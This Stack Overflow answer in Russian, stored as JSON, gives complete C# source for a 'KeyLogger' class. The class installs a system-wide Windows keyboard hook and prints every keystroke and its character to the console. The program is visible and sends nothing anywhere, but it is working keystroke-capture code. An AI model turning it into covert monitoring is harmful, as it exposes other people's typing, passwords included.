{"owner":{"reputation":16058,"user_id":240512,"user_type":"registered","profile_image":"https://i.stack.imgur.com/Ew6lG.png?s=128&g=1","display_name":"MSDN.WhiteKnight","link":"https://ru.stackoverflow.com/users/240512/msdn-whiteknight"},"is_accepted":false,"score":5,"last_activity_date":1554180345,"last_edit_date":1554180345,"creation_date":1536727522,"answer_id":880287,"question_id":879772,"body":"<p>Как-то так:</p>\n\n<pre><code>using System;\nusing System.Collections.Generic;\nusing System.Text;\nusing System.Runtime.InteropServices;\nusing System.ComponentModel;\nusing System.Windows.Forms;\n\nnamespace ConsoleApplication1\n{\n    class Program\n    {\n        static KeyLogger k;\n\n        static void Main(string[] args)\n        {            \n            k = new KeyLogger();\n            k.Start();\n\n            Console.CancelKeyPress += Console_CancelKeyPress;\n            Console.WriteLine(\"Started listening for keyboard events...\");\n            Application.Run();\n        }\n\n        private static void Console_CancelKeyPress(object sender, ConsoleCancelEventArgs e)\n        {\n            k.Stop();            \n            Application.Exit();\n        }\n    }\n\n    sealed class KeyLogger : IDisposable //отслеживает события клавиатуры с помощью низкоуровневого хука Windows\n    {\n        //объявления типов, констант и функций Windows API\n        delegate IntPtr KeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);\n        const int WH_KEYBOARD_LL = 13;\n        const int HC_ACTION = 0;\n        const int WM_KEYDOWN = 0x0100;\n        const uint VK_CAPITAL = 0x14;        \n\n        [DllImport(\"user32.dll\", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]\n        static extern IntPtr SetWindowsHookEx(int idHook, KeyboardProc lpfn, IntPtr hInstance, int threadId);\n\n        [DllImport(\"user32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\n        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);\n\n        [DllImport(\"user32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        private static extern bool UnhookWindowsHookEx(IntPtr hhk);\n\n        [DllImport(\"kernel32.dll\")]\n        private static extern IntPtr LoadLibrary(string dllToLoad);\n\n        [DllImport(\"USER32.dll\")]\n        public static extern short GetKeyState(int vKey);\n\n        [DllImport(\"user32.dll\")]\n        public static extern short GetAsyncKeyState(int vKey);\n\n        [DllImport(\"user32.dll\")]\n        public static extern int ToUnicodeEx(\n            uint wVirtKey,\n            uint wScanCode,\n            byte[] lpKeyState,\n            [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,\n            int cchBuff,\n            uint wFlags,\n            IntPtr dwhkl);\n\n        [DllImport(\"user32.dll\")]\n        public static extern bool GetKeyboardState(byte[] lpKeyState);\n\n        [DllImport(\"user32.dll\")]\n        public static extern uint MapVirtualKey(\n            uint uCode,\n            uint uMapType);\n\n        [DllImport(\"user32.dll\")]\n        public static extern IntPtr GetKeyboardLayout(uint idThread);\n\n        [DllImport(\"user32.dll\")]\n        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, IntPtr ProcessId);\n\n        [DllImport(\"user32.dll\")]\n        public static extern IntPtr GetForegroundWindow();\n\n        //преобразование виртуального кода клавиши в его Юникод-представление\n        public static string VKCodeToUnicode(uint vkCode)\n        {\n            StringBuilder buf = new StringBuilder();\n\n            byte[] keyboardState = new byte[255];\n\n            short x;\n            byte y;\n\n            for (int i = 0; i &lt; 255; i++)\n            {\n                if (i == VK_CAPITAL)\n                {\n                    x = GetKeyState(i);\n                }\n                else\n                {\n                    x = GetAsyncKeyState(i);\n                }\n                y = 0;\n                if ((x &amp; 0x8000) != 0) y = (byte)(y | 0x80);\n                if ((x &amp; 0x0001) != 0) y = (byte)(y | 0x01);\n                keyboardState[i] = y;\n            }\n\n            ToUnicodeEx(vkCode, MapVirtualKey(vkCode, 0), keyboardState, buf, 5, 0,\n                GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero)));\n            return buf.ToString();\n        }\n\n        IntPtr _hookID = IntPtr.Zero;                \n\n        //начинает отслеживание событий клавиатуры\n        public void Start()\n        {\n            if (disposed) throw new ObjectDisposedException(\"KeyLogger\");\n            if (_hookID != IntPtr.Zero) return;\n\n            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookCallback, IntPtr.Zero, 0);\n\n            if (_hookID == IntPtr.Zero)\n            {\n                int error = Marshal.GetLastWin32Error();\n                throw new Win32Exception(error, \"Failed to install hook! Error: \"+ error.ToString());\n            }            \n        }\n\n        //останавливает отслеживание событий клавиатуры\n        public void Stop()\n        {\n            if (disposed) return;\n            if (_hookID == IntPtr.Zero) return;\n\n            UnhookWindowsHookEx(_hookID);\n            _hookID = IntPtr.Zero;              \n        }               \n\n        //вызывается Windows при нажатии клавиши\n        IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)\n        {\n            if (nCode &gt;= 0 &amp;&amp; wParam == (IntPtr)WM_KEYDOWN)\n            {\n                int vkCode = Marshal.ReadInt32(lParam);\n\n                string s = VKCodeToUnicode((uint)vkCode);\n\n                Console.Out.WriteLine(\"Key: \" + ((Keys)vkCode).ToString() + \"; Character: \" + s);\n            }\n            return CallNextHookEx(_hookID, nCode, wParam, lParam);\n        }\n\n        //так как KeyLogger использует неуправляемый ресурс, реализуем Dispose и Finalize...\n        bool disposed = false;                  \n\n        public void Dispose()\n        {\n            if (disposed) return;\n\n            Stop();\n            disposed = true;\n            GC.SuppressFinalize(this);\n        }\n\n        ~KeyLogger()\n        {            \n            Dispose();\n        }  \n    }\n}\n</code></pre>\n\n<p><em>Известная проблема (Windows 10): если активно консольное окно, всегда распознаются символы раскладки, установленной в момент создания консоли, вместо текущей раскладки.</em></p>\n\n<p>Основано на данных вопросах:</p>\n\n<p><a href=\"https://ru.stackoverflow.com/questions/767999/getkeyboardstate-%D0%BE%D0%BF%D1%80%D0%B5%D0%B4%D0%B5%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5-%D1%81%D0%BE%D1%81%D1%82%D0%BE%D1%8F%D0%BD%D0%B8%D1%8F-%D0%BA%D0%BB%D0%B0%D0%B2%D0%B8%D1%88%D0%B8/768514#768514\">GetKeyboardState: определение состояния клавиши</a></p>\n\n<p><a href=\"https://ru.stackoverflow.com/questions/494568/%D0%9D%D0%B5%D0%BA%D0%BE%D1%80%D1%80%D0%B5%D0%BA%D1%82%D0%BD%D0%B0%D1%8F-%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D0%B0-%D0%BF%D0%B5%D1%80%D0%B5%D1%85%D0%B2%D0%B0%D1%82%D1%87%D0%B8%D0%BA%D0%B0-%D0%BD%D0%B0%D0%B6%D0%B0%D1%82%D1%8B%D1%85-%D0%BA%D0%BB%D0%B0%D0%B2%D0%B8%D1%88-%D0%BA%D0%B5%D0%B9%D0%BB%D0%BE%D0%B3%D0%B3%D0%B5%D1%80-c\">Некорректная работа перехватчика нажатых клавиш (кейлоггер) C#</a></p>\n"}